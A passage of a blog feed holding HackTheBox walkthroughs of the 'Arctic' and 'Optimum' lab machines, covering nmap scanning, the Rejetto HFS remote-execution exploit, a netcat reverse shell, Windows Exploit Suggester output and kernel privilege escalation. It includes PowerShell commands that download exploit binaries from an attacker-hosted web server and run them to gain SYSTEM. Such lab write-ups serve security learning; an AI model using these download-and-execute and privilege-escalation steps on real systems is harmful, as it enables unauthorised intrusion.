&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS12-037: Cumulative Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Internet Explorer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2699988&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS11-011: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2393802&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS10-073: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel-Mode Drivers Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;981957&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS10-061: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Print Spooler Service Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2347290&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS10-059: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the Tracing Feature &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Services Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;982799&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS10-047: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;981852&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS10-002: Cumulative Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Internet Explorer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;978207&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS09-072: Cumulative Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Internet Explorer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;976325&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After some trial and error, MS10-059 gave me that root shell :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-windows&quot;&gt;C:\Users\tolis\Desktop&amp;gt;powershell.exe -c &quot;(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.19:8000/MS10-059.exe','C:\Users\tolis\Desktop\exploit.exe')&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/exploit.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Running the exploit&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/arctic/root.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Boom, root privelleges.&lt;/p&gt;</content><author><name>Emmet Friel</name></author><category term="HackTheBox" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:8000/ef_blog/htb/arctic/arctic.png" /><media:content medium="image" url="http://localhost:8000/ef_blog/htb/arctic/arctic.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Walkthrough - Optimum</title><link href="http://localhost:8000/ef_blog/hackthebox/hackthebox-optimum.html" rel="alternate" type="text/html" title="HackTheBox Walkthrough - Optimum" /><published>2020-04-07T00:00:00-07:00</published><updated>2020-04-07T00:00:00-07:00</updated><id>http://localhost:8000/ef_blog/hackthebox/hackthebox-optimum</id><content type="html" xml:base="http://localhost:8000/ef_blog/hackthebox/hackthebox-optimum.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;This box was interesting and a pain, it took me longer than it should have but it gave me a solid foundation on windows privilege escalation that I can refer back to and that you can’t rely on the exploit tools to do all the work for you! Lets get started.&lt;/p&gt;

&lt;h1 id=&quot;reconnaissance--enumeration&quot;&gt;Reconnaissance &amp;amp; Enumeration&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap.nmap 10.10.10.8
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-04-07 10:53 BST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.8
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.029s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2012 or Windows Server 2012 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2012 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;91%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 Professional &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;87%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Phone 7.5 or 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;86%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows 7 or Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 or Windows 8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2008 R2 SP1 or Windows 8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Microsoft Windows Server 2016 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;85%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;conditions non-ideal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;128.40 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;-sC : scripting scan, equivalent to also writing –script=default&lt;/li&gt;
  &lt;li&gt;-sV: service version&lt;/li&gt;
  &lt;li&gt;-O  : Operating System version&lt;/li&gt;
  &lt;li&gt;-p- : scanning all 65536 ports&lt;/li&gt;
  &lt;li&gt;-oN: Output result to a normal text file called nmap.nmap&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/optimum/hfs_opt.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;HFS Webpage running on port 80&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Any webpage running on port 80 I always perform a dirb and nikto scan in the background, so I did just that however a quick search on the service version gave me everything I needed to get access into the system.&lt;/p&gt;

&lt;p&gt;The exploit I used was: &lt;a href=&quot;https://www.exploit-db.com/exploits/39161&quot; target=&quot;_blank_&quot;&gt;Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)&lt;/a&gt; which refers to CVE-2014-6287. The vulnerability is&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;“The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.” In other words, using the search bar on the website we can execute code server side using the null sequence.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There are now two approaches to exploit the machine:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Execute commands in the search bar on the website using the null byte (%00)&lt;/li&gt;
  &lt;li&gt;Use the exploit script we found through a quick search.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For simplicity, I am going to use the scripting option.&lt;/p&gt;

&lt;h1 id=&quot;shell-access&quot;&gt;Shell Access&lt;/h1&gt;

&lt;p&gt;To use the script there are 3 important variables:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Change the IP address to your own:
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip_addr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;192.168.44.128&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#local IP address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Change the port which you are going to listen on:
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; local_port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;443&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Local Port number&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Host a webserver serving netcat (nc.exe). I am using SecLists GitHub repo for nc.exe which you can clone from their GitHub page.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#EDB Note: You need to be using a web server hosting netcat (http://&amp;lt;attackers_ip&amp;gt;:80/nc.exe).  &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#          You may need to run it multiple times for success!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Once I edited the script, I setup my netcat listener, python webserver and then executed the script: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python 39161.py &amp;lt;target IP&amp;gt; &amp;lt;target port&amp;gt;&lt;/code&gt; 
Note that it may take a few attempts for the script to work.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/htb/optimum/opt_terminal.png&quot; alt=&quot;image&quot; /&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;em&gt;Running the attack and having a reverse shell access to the victim machine&lt;/em&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;privilege-escalation-using-windows-suggester&quot;&gt;Privilege Escalation using Windows Suggester&lt;/h1&gt;

&lt;p&gt;You can see I am user “kostas” from the terminal. I do not have Admin permissions so it’s time to escalate to root! To do this I used the &lt;a href=&quot;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&quot; target=&quot;_blank_&quot;&gt;Windows Exploit Suggester&lt;/a&gt; tool. The tool is really simple and extremely powerful, it compares all the patches on the machine to Microsoft’s patch database and outputs a “suggested” list of exploits. I have seen older tutorials use “Sherlock” instead of “Windows Suggester” but if you have a look at Sherlock’s GitHub, the repo hasn’t been updated in 3 years :\&lt;/p&gt;

&lt;p&gt;To do this, run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; and then copy and paste the output to a file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo.txt&lt;/code&gt; in my case&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-windows&quot;&gt;C:\Users\kostas\Desktop&amp;gt;systeminfo
&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/optimum# python windows-exploit-suggester.py &lt;span class=&quot;nt&quot;&gt;--update&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; initiating winsploit version 3.3...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] writing to file 2020-04-07-mssb.xls
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/boxes/optimum# python windows-exploit-suggester.py &lt;span class=&quot;nt&quot;&gt;--database&lt;/span&gt; 2020-04-07-mssb.xls &lt;span class=&quot;nt&quot;&gt;--systeminfo&lt;/span&gt; systeminfo.txt &lt;span class=&quot;nt&quot;&gt;--quiet&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; initiating winsploit version 3.3...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; database file detected as xls or xlsx based on extension
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; attempting to &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;from the systeminfo input file
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] systeminfo input file &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;successfully &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ascii&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; querying database file &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;potential vulnerabilities
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; comparing the 32 hotfix&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;es&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; against the 266 potential bulletins&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; with a database of 137 known exploits
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; there are now 246 remaining vulns
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] exploitdb PoC, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] Metasploit module, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; missing bulletin
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] windows version identified as &lt;span class=&quot;s1&quot;&gt;'Windows 2012 R2 64-bit'&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-135: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows Kernel-Mode Drivers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3199135&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-098: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows Kernel-Mode Drivers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3178466&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS16-075: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows SMB Server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3164038&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-074: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Microsoft Graphics Component &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3164036&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-063: Cumulative Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Internet Explorer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3163649&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-032: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Secondary Logon to Address Elevation of Privile &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3143141&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS16-016: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;WebDAV to Address Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3136041&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-014: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Microsoft Windows to Address Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3134228&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-007: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Microsoft Windows to Address Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3124901&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-132: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Microsoft Windows to Address Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3116162&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-112: Cumulative Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Internet Explorer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3104517&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-111: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows Kernel to Address Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3096447&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-102: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Task Management Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3089657&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-097: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft Graphics Component Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3089656&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS15-078: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Microsoft Font Driver Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3079904&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-052: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel Could Allow Security Feature Bypass &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3050514&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS15-051: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel-Mode Drivers Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3057191&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-010: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel-Mode Driver Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3036220&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS15-001: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Application Compatibility Cache Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3023266&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS14-068: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kerberos Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3011780&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS14-064: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows OLE Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3011443&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS14-060: Vulnerability &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows OLE Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3000869&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS14-058: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Kernel-Mode Driver Could Allow Remote Code Execution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3000061&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Critical
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS13-101: Vulnerabilities &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Windows Kernel-Mode Drivers Could Allow Elevation of Privilege &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2880430&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;M] MS13-090: Cumulative Security Update of ActiveX Kill Bits &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2900986&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; – Critical
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The output of windows-exploit-suggester shows a grand collection of exploits to try out so at this stage it’s really trial and error. Note that some attempts caused the machine to crash and so you would have to set up the reverse shell again, nothing major.
After trial and error, MS16-098 got me that nice root shell :)&lt;/p&gt;

&lt;p&gt;I placed the exploit on the python webserver, downloaded it from the victims machine and then executed it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-windows&quot;&gt;C:\Users\kostas\Desktop&amp;gt;powershell.exe -c &quot;(New-Object System.Net.WebClient).DownloadFile('http://10.X.X.X/bfill.exe','C:\Users\kostas\Desktop\exploit.exe')&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-windows&quot;&gt;C:\Users\kostas\Desktop&amp;gt;exploit.exe
exploit.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved. 

C:\Users\kostas\Desktop&amp;gt;whoami
whoami
nt authority\system
&lt;/code&gt;&lt;/pre&gt;</content><author><name>Emmet Friel</name></author><category term="HackTheBox" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:8000/ef_blog/htb/optimum/optimum.png" /><media:content medium="image" url="http://localhost:8000/ef_blog/htb/optimum/optimum.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>